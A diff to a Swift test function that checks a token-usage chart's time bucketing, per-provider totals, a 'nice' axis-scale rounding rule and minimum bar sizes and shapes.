     // Wall-clock buckets: the newest starts at floor(now / 5) * 5, future records clamp, old records drop.
     var flowReading = reading("codex:flow", .codex)
@@ -393,16 +563,20 @@ func runSessionPresentationChecks() -> [String] {
     check(flow.fresh[59] && flow.fresh[58] && !flow.fresh[57], "fresh marks buckets holding a record from the last 5 s")
     check(flow.byProvider[.codex] == 230 && flow.byProvider[.claude] == 5 && flow.last?.tokens == 40
           && flow.last?.at == Date(timeIntervalSince1970: 1_000_007), "provider totals and last record")
-    check(flow.rows["codex:flow"]?.buckets.count == 24 && flow.rows["codex:flow"]?.buckets[23] == 50
-          && flow.rows["telemetry:x"] == nil, "rows keep 2 minutes per reading; telemetry contributes nothing")
+    check(flow.byProvider[.codex] == 230 && FlowSeries.make([telemetryFlow], now: now).total == 0, "telemetry contributes nothing")
     let shifted = FlowSeries.make([flowReading], now: Date(timeIntervalSince1970: 1_000_004.9))
     let next = FlowSeries.make([flowReading], now: Date(timeIntervalSince1970: 1_000_005))
     check(shifted.newest == flow.newest && shifted.hero[58] == 20 && shifted.hero[0] == 160
           && next.hero[57] == 20 && next.hero[58] == 10, "buckets stay put within an interval and shift on the boundary")
-    check(niceMax(200) == 200 && niceMax(201) == 500 && niceMax(786) == 1_000 && niceMax(1_001) == 2_000 && niceMax(5_000) == 5_000,
-          "nice scale rounds to 1/2/5 × 10ⁿ")
-    let speck = FlowBars(values: [0, 1], scale: 1_000, minHeight: 3, minWidth: 1.5).path(in: CGRect(x: 0, y: 0, width: 4, height: 8))
-    check(speck.boundingRect.height == 3 && speck.boundingRect.width >= 1.5, "child bars have a readable minimum size")
+    check(niceMax(200) == 200 && niceMax(201) == 300 && niceMax(786) == 800 && niceMax(1_001) == 1_500 && niceMax(5_000) == 5_000
+          && niceMax(6_100) == 8_000 && niceMax(8_100) == 10_000 && niceMax(0) == 1, "nice scale rounds to {1, 1.5, 2, 3, 4, 5, 6, 8} × 10ⁿ")
+    let fills = stride(from: 1.0, through: 100_000, by: 7.3).map { $0 / niceMax($0) }
+    check(fills.allSatisfy { $0 >= 2.0 / 3 - 1e-9 && $0 <= 1 }, "the tallest bar fills at least 2/3 of the plot")
+    let speck = FlowBars(values: [0, 1], scale: 1_000).path(in: CGRect(x: 0, y: 0, width: 4, height: 36))
+    let tall = FlowBars(values: [10], scale: 10).path(in: CGRect(x: 0, y: 0, width: 10, height: 36))
+    check(speck.boundingRect.height == 2 && speck.boundingRect.width == 2 && tall.boundingRect.width == 6
+          && tall.contains(CGPoint(x: 2.05, y: 35.95)) && !tall.contains(CGPoint(x: 2.05, y: 0.05)),
+          "bars are at least 2 × 2 pt, 0.6 of the slot, with square bottoms and rounded tops")
 
     // Formats and honest speed.
     check(Format.tokens(786) == "786" && Format.tokens(12_480) == "12,480" && Format.tokens(123_400) == "123.4k"
